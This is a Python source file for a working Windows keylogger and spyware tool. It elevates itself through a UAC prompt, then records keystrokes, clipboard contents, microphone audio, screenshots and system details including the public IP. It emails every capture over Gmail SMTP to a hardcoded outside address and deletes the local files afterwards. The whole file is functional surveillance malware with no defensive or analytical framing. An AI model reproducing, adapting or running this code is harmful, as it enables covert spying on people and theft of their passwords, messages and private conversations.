try:
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    from email.mime.base import MIMEBase
    from email import encoders
    import smtplib
    import socket
    import platform
    import win32clipboard
    from pynput.keyboard import Key, Listener
    import time
    import os
    from scipy.io.wavfile import write
    import sounddevice as sd
    import getpass
    from requests import get
    from multiprocessing import Process, freeze_support
    from PIL import ImageGrab
    from threading import Timer
    import ctypes
    import sys
except ModuleNotFoundError:
    from subprocess import call

    modules = ["pywin32", "sounddevice", "pynput", "scipy", "cryptography", "requests", "pillow", "sounddevice"]
    call("pip install " + ' '.join(modules), shell=True)



finally:
    #########################################################################
    def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False


    if is_admin():
        keys_information = "key_log.txt"
        system_information = "systeminfo.txt"
        clipboard_information = "clipboard.txt"
        audio_information = "audio.wav"
        screenshot_information = "screenshot.png"

        microphone_time = 10
        time_iteration = 15
        number_of_iterations_end = 3

        email_address = input('Please enter your e-mail address:') # Enter your mail ID
        password = input('Enter your e-mail password:') # Enter your password

        username = getpass.getuser()

        toaddr = "tarunpereddi.projects@gmail.com"

        file_path = "C:\\Program Files"
        extend = "\\"
        file_merge = file_path + extend


        # email controls
        def send_email(filename, attachment, toaddr):
            fromaddr = email_address

            msg = MIMEMultipart()

            msg['From'] = fromaddr

            msg['To'] = toaddr

            msg['Subject'] = username

            body = "Log File"

            msg.attach(MIMEText(body, 'plain'))

            filename = filename
            attachment = open(attachment, 'rb')

            p = MIMEBase('application', 'octet-stream')

            p.set_payload(attachment.read())

            encoders.encode_base64(p)

            p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

            msg.attach(p)

            s = smtplib.SMTP('smtp.gmail.com', 587)

            s.starttls()

            s.login(fromaddr, password)

            text = msg.as_string()

            s.sendmail(fromaddr, toaddr, text)

            s.quit()


        # get the computer information
        def computer_information():
            with open(file_path + extend + system_information, "a") as f:
                hostname = socket.gethostname()
                IPAddr = socket.gethostbyname(hostname)
                try:
                    public_ip = get("https://api.ipify.org").text
                    f.write("Public IP Address: " + public_ip + "\n")

                except Exception:
                    f.write("Couldn't get Public IP Address (most likely max query")

                f.write("Processor: " + (platform.processor()) + '\n')
                f.write("System: " + platform.system() + " " + platform.version() + '\n')
                f.write("Machine: " + platform.machine() + "\n")
                f.write("Hostname: " + hostname + "\n")
                f.write("Private IP Address: " + IPAddr + "\n")


        # get the clipboard contents
        def copy_clipboard():
            with open(file_path + extend + clipboard_information, "a") as f:
                try:
                    win32clipboard.OpenClipboard()
                    pasted_data = win32clipboard.GetClipboardData()
                    win32clipboard.CloseClipboard()

                    f.write("Clipboard Data: \n" + pasted_data)

                except:
                    f.write("Clipboard could be not be copied")


        # get the microphone
        def microphone():
            fs = 44100
            seconds = microphone_time

            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait()

            write(file_path + extend + audio_information, fs, myrecording)


        # get screenshots
        def screenshot():
            im = ImageGrab.grab()
            im.save(file_path + extend + screenshot_information)


        # Keylogger

        count = 0
        keys = []


        def on_press(key):
            global keys, count

            keys.append(key)
            count += 1

            if count >= 1:
                count = 0
                write_file(keys)
                keys = []


        def write_file(keys):
            with open(file_path + extend + keys_information, "a") as f:
                for key in keys:
                    k = str(key).replace("'", "")
                    if k.find("space") > 0:
                        f.write('\n')
                        f.close()
                    elif k.find("Key") == -1:
                        f.write(k)
                        f.close()


        forever = 0
        while forever < 10:
            with Listener(on_press=on_press) as listener:
                Timer(30, listener.stop).start()
                listener.join()
                # Functions
                copy_clipboard()
                microphone()
                computer_information()
                screenshot()
                write_file(keys)
                # Mail
                files_to_send = [file_merge + keys_information, file_merge + system_information,
                                 file_merge + clipboard_information,
                                 file_merge + screenshot_information, file_merge + audio_information]

                for x in range(len(files_to_send)):
                    send_email(files_to_send[x], files_to_send[x], toaddr)

                # Delete files
                delete_files = [file_merge + keys_information, file_merge + system_information,
                                file_merge + clipboard_information,
                                file_merge + screenshot_information, file_merge + audio_information]
                for file in delete_files:
                    os.remove(file)
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
